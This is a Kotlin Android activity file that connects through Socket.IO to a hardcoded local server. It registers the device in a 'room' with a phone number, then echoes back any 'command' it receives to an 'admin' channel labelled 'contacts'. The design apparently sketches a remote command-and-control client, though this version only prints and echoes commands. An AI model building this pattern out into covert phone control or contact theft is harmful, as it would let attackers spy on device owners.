package android.systems.myapplication

import androidx.appcompat.app.AppCompatActivity
import android.os.Bundle
import io.socket.client.Socket
import io.socket.client.IO
import org.json.JSONObject

class MainActivity : AppCompatActivity() {
    lateinit var mSocket: Socket

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_main)

        try{

            mSocket = IO.socket("http://192.168.1.5:80")
            mSocket.connect()
            mSocket.on("msg"){args->
                if(args[0]!=null){
                    var message = args[0] as JSONObject;
                    var data = message.get("command") as String;
                    var sender = message.get("sender") as String;
                    var dateNow = "15/09/1999"
                    var timeNow = "12:15"
                    var username = getString(R.string.username)
                    var room = getString(R.string.room)
                    var obj = "{\"type\":\"contacts\",\"secret\":\"secret\",\"admin\":\"$sender\",\"command\":\"the command (btw fucQ)i got was $data\"," +
                            "\"clientName\":\"$username\",\"date\":\"$dateNow\",\"time\":\"$timeNow\"}"
                    println("the command is $data")

                    mSocket.emit("toAdmin",obj)
                }
            }
            var username = getString(R.string.username)
            var room = getString(R.string.room)
            var cons = "{\"room\":\"$room\",\"username\":\"$username\",\"constr\":{\"os\":\"android\",\"phnum\":\"807564591\"}}"
            mSocket.emit("joinRoom",cons)
        }
        catch (e: Exception){
            print(e)
        }

    }
}
